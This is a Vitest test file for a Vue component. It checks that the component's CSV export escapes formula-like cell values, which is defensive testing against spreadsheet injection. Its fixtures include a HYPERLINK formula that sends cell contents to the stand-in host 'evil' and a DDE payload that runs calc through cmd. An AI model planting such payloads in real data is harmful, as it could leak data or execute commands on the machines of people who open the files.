import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { render, fireEvent } from '@testing-library/vue'
import { setActivePinia, createPinia } from 'pinia'
import ClusterNodeModal from '@/components/ClusterNodeModal.vue'
import { useGraphStore } from '@/stores/graph'
import { useClusterStore } from '@/stores/cluster'
import type { Cluster } from '@/types/cluster'

beforeEach(() => {
  setActivePinia(createPinia())
})

afterEach(() => {
  document.body.querySelectorAll('.modal-overlay').forEach((el) => el.remove())
})

describe('ClusterNodeModal CSV export (M4)', () => {
  it('exports formula-like values as text while numbers stay numbers', async () => {
    const graphStore = useGraphStore()
    graphStore.nodes = [
      { node_id: 'n1', node_type: 'Person', properties: { name: '=HYPERLINK("http://evil/?"&A1,"Click")', balance: '-5' } },
      { node_id: 'n2', node_type: 'Person', properties: { name: '+cmd|\'/c calc\'!A1', balance: '10' } },
      { node_id: 'n3', node_type: 'Person', properties: { name: 'Outside' } },
    ]
    const clusterStore = useClusterStore()
    clusterStore.clusters = [{
      cluster_id: 'c1',
      cluster_name: 'Suspects',
      cluster_class: 'risk',
      figure: 'circle',
      state: 'open',
      node_ids: ['n1', 'n2'],
    } as unknown as Cluster]

    let blob: Blob | undefined
    vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => { blob = b as Blob; return 'blob:test' })
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {})
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})

    const { container } = render(ClusterNodeModal, { props: { clusterId: 'c1' } })
    await fireEvent.click(container.querySelector('button[title="Export CSV"]')!)

    const csv = await blob!.text()
    expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&A1,""Click"")"`)
    expect(csv).toContain("'+cmd|'/c calc'!A1")
    expect(csv).not.toMatch(/(^|,)[=+@]/m)
    expect(csv).toMatch(/,-5(,|$)/m)
    expect(csv).not.toContain('Outside')
  })
})
